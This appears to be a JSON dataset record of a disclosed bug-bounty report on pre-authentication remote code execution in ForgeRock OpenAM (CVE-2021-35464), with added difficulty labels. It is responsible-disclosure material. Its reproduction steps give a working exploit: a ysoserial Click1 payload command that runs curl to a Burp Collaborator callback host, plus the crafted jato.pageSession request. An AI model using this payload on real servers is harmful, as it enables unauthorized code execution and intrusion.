{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "fdeleite ",
  "title": "Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)",
  "content": "\nRCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.\nSupporting Material/References\nhttps://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464\nImpact\nAn unauthenticated, 3rd-party attacker or adversary can execute remote code\nSystem Host(s)\n\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2021-35464\nSteps to Reproduce\nSteps To Reproduce\nTarget domain: \u2588\u2588\u2588\u2588\nFirst we need to build the payload:\nDownload this jar file wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar\nthen\njava -jar ysoserial-master-SNAPSHOT.jar Click1 \"curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net\" | (echo -ne \\\\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\\n' > payload.txt\nYou need to change the burp Collaborator id to test it properly.\nThe payload is now saved in the payload.txt file.\nNow we need to use the following request:\nCode 75 Bytes\n1GET /openam/ccversion/Version?jato.pageSession=XYZ HTTP/1.1\n2Host: 127.0.0.1\nReplace XYZ by the payload saved into the payload.txt file.\nThe response\nCode 116 Bytes\n1HTTP/1.1 302 Found\n2Cache-Control: private\n3Location: https://127.0.0.1:443/openam/base/AMInvalidURL\n4Content-Length: 0\nThe HTTP Request sent the collaborator :\n\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1703198700,
  "report_url": "https://hackerone.com/reports/1248052",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Download the ysoserial jar file and generate a payload using a command that includes a malicious URL."
    ],
    [
      2,
      "Send a crafted GET request to the target OpenAM server with the generated payload in the 'jato.pageSession' parameter."
    ]
  ],
  "vuln_description": "This vulnerability is a pre-authentication Remote Code Execution (RCE) in ForgeRock OpenAM, caused by unsafe Java deserialization in the Jato framework. An attacker can exploit this by sending a specially crafted request that triggers the deserialization of malicious payloads, leading to arbitrary code execution on the server.",
  "reason": "The attack involves generating a serialized payload and crafting a specific HTTP request, which requires knowledge of Java deserialization vulnerabilities and the structure of the vulnerable endpoint. However, the steps are straightforward once the payload generation and endpoint are known, and the vulnerability is a common type (unsafe deserialization) with known exploitation patterns.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves unsafe Java deserialization in the Jato framework, which is not directly related to authentication or authorization boundaries being crossed. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply to this RCE vulnerability.",
    "is_detectable": false
  }
}